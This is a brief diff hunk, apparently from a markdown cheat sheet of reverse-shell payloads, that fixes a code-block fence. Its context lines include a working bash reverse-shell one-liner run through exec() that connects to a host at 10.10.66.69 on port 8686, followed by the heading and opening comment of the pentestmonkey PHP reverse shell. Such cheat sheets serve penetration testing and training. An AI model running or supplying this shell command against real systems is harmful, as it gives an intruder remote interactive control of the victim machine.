@@ -67,7 +67,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.66.69/8686 0>&1'")
 ```
 
 ## More reliable PHP Reverse Shell from pentestmonkey.net
-``
+```
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
